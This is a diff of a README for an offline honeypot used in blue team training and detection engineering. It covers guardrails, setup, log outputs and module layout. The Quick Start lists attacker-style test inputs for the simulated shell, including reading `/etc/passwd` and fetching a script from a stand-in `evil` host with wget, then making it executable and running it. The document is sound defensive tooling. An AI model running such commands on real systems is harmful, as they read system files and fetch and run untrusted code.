@@ -1,34 +1,55 @@
-# Offline AI Honeypot
+# The Ultimate Honeypot (Offline Defensive Research Platform)
 
-Offline defensive honeypot for blue team/purple team exercises.
+An **offline, AI-inspired deception honeypot** for defensive research, blue team training, purple team exercises, threat hunting, and detection engineering.
 
-## Safety
-Never executes commands, no cloud AI, local-only default bind, simulated outputs only.
+This platform is intentionally designed to:
+- Simulate vulnerable-seeming services (SSH/Telnet/HTTP-like interactive sessions).
+- Use local generative response logic to maintain believable deception.
+- Capture attacker behaviors as structured evidence.
+- Map activity to MITRE ATT&CK techniques.
+- Export SOC-ready JSONL logs and a consolidated incident report.
 
-## Run locally
+## Safety Guardrails
+
+This project is **defensive-only** and enforces:
+- No real command execution from attacker input.
+- No cloud AI service calls.
+- No real credentials.
+- No access to real enterprise systems.
+- No payload detonation.
+
+## Quick Start
+
 ```bash
-cd backend
-python -m venv .venv && source .venv/bin/activate
+python3 -m venv .venv
+source .venv/bin/activate
 pip install -r requirements.txt
-uvicorn app.main:app --host 127.0.0.1 --port 8000
+python3 main.py
 ```
 
-## TCP listener
-Instantiate `TCPListener` from `app.listener` to run on `127.0.0.1:2222`.
+Then connect locally from a second terminal:
 
-## Docker
-`docker compose up --build`
+```bash
+nc 127.0.0.1 2222
+```
 
-## Offline model setup
-Supports local provider patterns (Ollama/llama.cpp/LM Studio) through offline-only architecture. Cloud endpoints blocked by config validation.
+Try commands like `whoami`, `uname -a`, `cat /etc/passwd`, `wget http://evil`, `chmod +x a.sh`, `./a.sh`.
 
-## Splunk/Sentinel
-Use `logs/session_events.jsonl` or exported report JSON.
+## Output
 
-## Windows installer (offline)
-- `pyinstaller --onefile --name OfflineAIHoneypot backend\app\main.py`
-- Package frontend static assets.
-- Install configs/logs/reports into `C:\ProgramData\OfflineAIHoneypot\...` via Inno Setup/NSIS.
+Artifacts are written under `artifacts/`:
+- `session_events.jsonl`
+- `alerts.jsonl`
+- `ioc_summary.json`
+- `soc_report.md`
 
-## Known limitations
-Current dashboard UI is minimal and service personalities beyond Linux/Windows are starter stubs.
+## Architecture
+
+- `main.py` – Entry point.
+- `honeypot/engine.py` – TCP listener/session orchestration.
+- `honeypot/deception.py` – Offline AI-inspired deception responder.
+- `honeypot/detection.py` – ATT&CK mapping + detections.
+- `honeypot/evidence.py` – Structured logging/reporting.
+- `honeypot/models.py` – Typed event and alert structures.
+- `honeypot/config.py` – Safe defaults and guardrails.
+
